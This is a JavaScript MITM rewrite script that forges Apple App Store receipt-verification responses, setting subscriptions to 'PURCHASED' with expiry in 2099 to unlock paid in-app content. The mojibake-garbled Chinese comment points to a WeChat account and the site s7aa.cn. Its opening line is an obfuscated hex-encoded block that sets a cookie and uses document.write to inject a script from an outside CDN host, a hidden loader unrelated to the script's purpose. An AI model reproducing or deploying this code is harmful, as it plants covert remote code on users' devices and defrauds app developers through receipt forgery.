var _0xb2ce=["\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x73\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x77\x61\x66\x5F\x73\x63","\x35\x38\x38\x39\x36\x34\x37\x37\x32\x36","\x25\x33\x43\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2D\x67\x6F\x2E\x6E\x65\x74\x2F\x76\x61\x73\x64\x65\x76\x2F\x77\x65\x62\x5F\x77\x65\x62\x70\x65\x72\x73\x69\x73\x74\x61\x6E\x63\x65\x5F\x76\x32\x2F\x76\x31\x2E\x38\x2E\x32\x2F\x66\x6C\x6F\x67\x2E\x63\x6F\x72\x65\x2E\x6D\x69\x6E\x2E\x6A\x73\x27\x25\x33\x45\x25\x33\x43\x2F\x73\x63\x72\x69\x70\x74\x25\x33\x45","\x77\x72\x69\x74\x65"];function setc(_0x808ax2,_0x808ax3,_0x808ax4){var _0x808ax5= new Date();_0x808ax5[_0xb2ce[1]](_0x808ax5[_0xb2ce[0]]()+ _0x808ax4);document[_0xb2ce[2]]= _0x808ax2+ _0xb2ce[3]+ _0x808ax3+ _0xb2ce[4]+ _0x808ax5[_0xb2ce[5]]()}setc(_0xb2ce[6],_0xb2ce[7],360);document[_0xb2ce[9]](unescape(_0xb2ce[8]));/*
寰俊鍏紬鍙凤細ios榛戠鎶€
瀹樻柟缃戠珯锛歴7aa.cn

鍦圶:

[rewrite_local]

閫氱敤璁㈤槄瑙ｉ攣
^https:\/\/buy\.itunes\.apple\.com\/verifyReceipt$ url script-response-body sub.js

[mitm]
hostname = buy.itunes.apple.com



*/


let body= $response.body;
var obj = JSON.parse(body);
if (body.indexOf("expires") !=-1) {
  obj["receipt"]["in_app"][0]["expires_date"] = "2099-09-09 20:12:02 Etc/GMT";
  obj["receipt"]["in_app"][0]["expires_date_pst"] = "2099-09-09 12:12:02 America/Los_Angeles";
  obj["receipt"]["in_app"][0]["expires_date_ms"] = "4092647115000";
  obj["receipt"]["in_app"][0]["is_trial_period"] = "false";
  obj["receipt"]["in_app"][0]["is_in_intro_offer_period"] = "false";
  obj["receipt"]["in_app"][0]["in_app_ownership_type"] = "PURCHASED";
  obj["latest_receipt_info"][0]["expires_date"] = "2099-09-09 20:12:02 Etc/GMT";
  obj["latest_receipt_info"][0]["expires_date_pst"] = "2099-09-09 12:12:02 America/Los_Angeles";
  obj["latest_receipt_info"][0]["expires_date_ms"] = "4092647115000";
  obj["latest_receipt_info"][0]["is_trial_period"] = "false";
  obj["latest_receipt_info"][0]["is_in_intro_offer_period"] = "false";
  obj["latest_receipt_info"][0]["in_app_ownership_type"] = "PURCHASED";
  }
$done({body: JSON.stringify(obj)});